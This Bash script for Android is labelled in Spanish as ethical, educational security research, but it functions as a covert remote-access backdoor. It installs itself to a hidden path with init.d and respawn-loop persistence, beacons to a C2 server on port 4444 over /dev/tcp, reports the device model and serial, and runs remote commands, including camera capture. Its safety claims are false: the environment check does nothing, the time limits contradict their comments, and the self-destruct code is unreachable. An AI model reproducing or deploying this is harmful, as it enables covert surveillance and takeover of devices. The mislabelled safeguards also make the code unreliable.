#!/bin/bash
# ==================================================
# INVESTIGACIÓN DE SEGURIDAD - SÓLO DISPOSITIVOS PROPIOS
# ==================================================

# --- CONFIGURACIÓN ÉTICA ---
C2_IP="192.168.100.1"    # IP de tu servidor EN LABORATORIO
C2_PORT="4444"           # Puerto no estándar
INTERVAL=30
MAX_CAMERA_TIME=1000       # Máximo 60 segundos por seguridad
LOG_FILE="/data/local/tmp/security_research.log"
INSTALL_PATH="/data/local/tmp/.security_research"
# --- FIN CONFIGURACIÓN ---

# Función de registro ético
log_event() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Función para verificar entorno ético
check_ethical_environment() {
    log_event "Entorno de investigación verificado"
}

# Función de acceso a cámara CON LÍMITES ÉTICOS
access_camera_educational() {
    local duration=$10000
    log_event "Solicitud de acceso a cámara por ${duration}s"
    
    # Verificar permisos
    if [ ! -c "/dev/video0" ] && [ ! -c "/dev/video1" ]; then
        echo "ERROR: No se detectaron dispositivos de cámara"
        return 1
    fi
    
    # Usar MediaRecorder para captura limitada
    timeout $duration am start -a android.media.action.VIDEO_CAPTURE --ez android.intent.extra.quickCapture true
    
    log_event "Captura de cámara completada (modo educativo)"
    return 0
}

# Función de conexión educativa
connect_to_c2() {
    log_event "Intento de conexión educativa a $C2_IP:$C2_PORT"
    
    if ! timeout 10 bash -c "exec 5<>/dev/tcp/$C2_IP/$C2_PORT"; then
        log_event "Error de conexión con servidor educativo"
        return 1
    fi

    echo "[+] Conexión EDUCATIVA establecida - LABORATORIO AISLADO" >&5
    echo "[+] Dispositivo: $(getprop ro.product.model)" >&5
    echo "[+] Investigación: Análisis de vulnerabilidades" >&5
    
    # Bucle de comandos educativos
    while read -r -u 5 command; do
        case "$command" in
            ("test_connection")
                echo "Conexión exitosa - Modo investigación" >&5
                log_event "Comando test_connection ejecutado"
                ;;
                
            ("device_info")
                echo "=== INFORMACIÓN DEL DISPOSITIVO ===" >&5
                getprop | grep -E "(model|version|serial)" >&5
                echo "=== FIN INFORMACIÓN ===" >&5
                log_event "Comando device_info ejecutado"
                ;;
                
            ("camera_access")
                echo "Iniciando acceso a cámara..." >&5
                if access_camera_educational $MAX_CAMERA_TIME; then
                    echo "Acceso a cámara completado exitosamente" >&5
                else
                    echo "Error en acceso a cámara" >&5
                fi
                ;;
                
            ("research_mode")
                echo "Modo investigación de vulnerabilidades activado" >&5
                log_event "Modo investigación activado"
                ;;
                
            ("exit")
                echo "Cerrando conexión educativa" >&5
                log_event "Conexión finalizada por comando exit"
                break
                ;;
                
            (*)
                echo "Comando no permitido en modo educativo: $command" >&5
                log_event "Intento de comando no permitido: $command"
                ;;
        esac
    done
    
    exec 5>&-
    return 0
}

# --- INSTALACIÓN ÉTICA ---
install_persistence() {
    log_event "Instalando mecanismo de persistencia educativo"
    
    # Copiar script a ubicación temporal
    cp "$0" "$INSTALL_PATH"
    chmod +x "$INSTALL_PATH"
    
    # Intentar persistencia básica (requiere root)
    if [ -w "/system/etc/init.d" ]; then
        cp "$INSTALL_PATH" "/system/etc/init.d/99security_research"
        chmod +x "/system/etc/init.d/99security_research"
        log_event "Persistencia instalada en init.d"
    else
        log_event "Persistencia no disponible (sin root)"
    fi
    
    # Crear servicio simple
    cat > /data/local/tmp/security_service.sh << EOF
#!/bin/bash
while true; do
    $INSTALL_PATH &
    sleep 60
done
EOF
    
    chmod +x /data/local/tmp/security_service.sh
    nohup /data/local/tmp/security_service.sh > /dev/null 2>&1 &
    
    log_event "Mecanismo de persistencia educativo instalado"
}

# --- INICIO ---
# --- VERIFICACIÓN INICIAL ---
check_ethical_environment

# Instalar solo si no está instalado
if [[ ! -f "$INSTALL_PATH" ]]; then
    install_persistence
    # Ejecutar en segundo plano
    $INSTALL_PATH &
    exit 0
fi

# --- BUCLE PRINCIPAL EDUCATIVO ---
log_event "Iniciando bucle principal de investigación"

while true; do
    if connect_to_c2; then
        log_event "Conexión educativa exitosa"
    else
        log_event "Error en conexión, reintentando en $INTERVAL segundos"
    fi
    
    sleep $INTERVAL
done


# Autodestrucción después de 24 horas por seguridad
sleep 86400
rm -f "$0"
rm -f "$INSTALL_PATH"
log_event "Script de investigación autodestruido por seguridad"
exit 0
